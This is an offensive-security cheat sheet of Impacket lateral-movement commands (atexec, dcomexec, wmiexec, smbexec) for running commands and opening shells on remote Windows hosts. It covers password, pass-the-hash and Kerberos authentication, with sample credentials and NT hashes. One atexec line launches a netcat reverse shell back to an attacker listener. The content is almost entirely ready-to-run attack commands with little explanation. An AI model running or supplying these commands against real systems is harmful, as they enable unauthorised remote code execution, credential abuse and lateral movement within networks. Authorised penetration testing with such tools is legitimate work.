# atexec

atexec can be used to create and run an immediate scheduled task on a remote target via SMB in order to execute commands on a target system.

- atexec.py
- impacket-atexec

```
# Prompt for user password
atexec.py acme/Administrator@DC01 whoami

# Pass the hash
atexec.py -hashes :'NThash' acme/Administrator@DC01 whoami

# kerberos ticket in memory
atexec.py -no-pass -k acme/Administrator@DC01 'powershell -c "nc.exe $lhost 4444 -e cmd.exe"'

impacket-atexec -k -no-pass -dc-ip 192.168.1.5 acme.corp/Administrator@dc01.acme.corp whoami

```

  
# dcomexec

  dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCOM endpoints.

```

python3 dcomexec.py -object MMC20 test.local/john:password123@192.168.1.2

  

dcomexec.py -object ShellBrowserWindow acme.corp/Administrator:Ticketmaster1968@192.168.1.2 cmd

dcomexec.py -object ShellWindows acme.corp/Administrator:Ticketmaster1968@192.168.1.2 cmd

dcomexec.py -object MMC20 acme.corp/Administrator:Ticketmaster1968@192.168.1.2 cmd

or

dcomexec.py -object ShellBrowserWindow acme.corp/Administrator:Ticketmaster1968@192.168.1.2 powershell

dcomexec.py -object ShellWindows acme.corp/Administrator:Ticketmaster1968@192.168.1.2 powershell

dcomexec.py -object MMC20 acme.corp/Administrator:Ticketmaster1968@192.168.1.2 powershell

  

impacket-dcomexec -k -no-pass acme/Administrator@acme.corp -shel-type powershell -dc-ip 192.168.1.2

impacket-dcomexec -k -no-pass acme/Administrator@acme.corp -shell-type powershell -dc-ip 192.168.1.2

impacket-dcomexec -k -no-pass acme/Administrator@acme.corp -shell-type cmd -dc-ip 192.168.1.2

impacket-dcomexec acme.corp/Carolann.Natalya@ws01.acme.corp -shell-type cmd -dc-ip 192.168.1.2

```

# wmiexec

```

wmiexec.py Administrator@WS01.acme.corp -dc-ip 10.10.12.25 -shell-type powershell

wmiexec.py Administrator@WS01.acme.corp -dc-ip 10.10.12.25 -shell-type powershell -service-name hello -share admin$
  
wmiexec.py dc01$\@dc01.acme.corp -hashes :8118cb8789b3a147c790db402b016a08 -shell-type powershell

wmiexec.py dc01$\@dc01.acme.corp -hashes :8118cb8789b3a147c790db402b016a08 -shell-type cmd

  
impacket-wmiexec dc01$\@dc01.acme.corp -hashes :8118cb8789b3a147c790db402b016a08 -shell-type cmd

impacket-wmiexec -k -no-pass -dc-ip 192.168.1.5 -shell-type powershell acme.corp/Carolann.Natalya@ws01.acme.corp

```

# smbexec
  
```

smbexec.py Administrator@WS01.acme.corp -dc-ip 10.10.12.25 -shell-type powershell -service-name byinarie -share admin$

smbexec.py admin@WS02.acme.corp -dc-ip 10.10.12.25 -shell-type cmd

impacket-smbexec Administrator@192.168.1.63 -hashes :8118cb8789b3a147c790db402b016a08 -shell-type powershell

impacket-smbexec Administrator@192.168.1.63 -shell-type powershell -service-name hello1 -share admin$

impacket-smbexec Administrator@192.168.1.63 -shell-type powershell -service-name hello

impacket-smbexec -no-pass -dc-ip 192.168.1.2 -shell-type powershell acme.corp/Administrator@hr-01.acme.corp -hashes :8118cb8789b3a147c790db402b016a08

```

